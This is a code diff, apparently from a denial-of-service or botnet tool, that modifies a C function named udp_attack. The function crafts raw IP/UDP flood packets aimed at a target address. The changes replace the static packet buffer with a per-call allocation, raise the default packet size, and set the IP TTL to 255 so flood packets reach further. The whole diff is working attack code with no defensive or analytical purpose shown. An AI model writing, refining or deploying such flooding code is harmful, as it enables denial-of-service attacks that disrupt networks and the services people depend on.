@@ -27,19 +27,14 @@ void* udp_attack(void* arg) {
         return NULL;
     }
 
-    static unsigned char *packet = NULL;
-    static int last_packet_size = 0;
     int min_packet_size = sizeof(struct iphdr) + sizeof(struct udphdr);
-    int packet_size = params->psize > 0 ? params->psize : 32;
+    int packet_size = params->psize > 0 ? params->psize : 48;
     if (packet_size < min_packet_size) packet_size = min_packet_size;
-    if (packet == NULL || last_packet_size != packet_size) {
-        if (packet) free(packet);
-        packet = malloc(packet_size);
-        if (!packet) {
-            close(udp_sock);
-            return NULL;
-        }
-        last_packet_size = packet_size;
+    
+    unsigned char *packet = malloc(packet_size);
+    if (!packet) {
+        close(udp_sock);
+        return NULL;
     }
     memset(packet, 0, packet_size);
 
@@ -58,7 +53,7 @@ void* udp_attack(void* arg) {
     iph->tot_len = htons(packet_size);
     iph->id = htons(rand() % 65535);
     iph->frag_off = 0;
-    iph->ttl = 64;
+    iph->ttl = 255;
     iph->protocol = IPPROTO_UDP;
     iph->saddr = INADDR_ANY;
     iph->daddr = params->target_addr.sin_addr.s_addr;
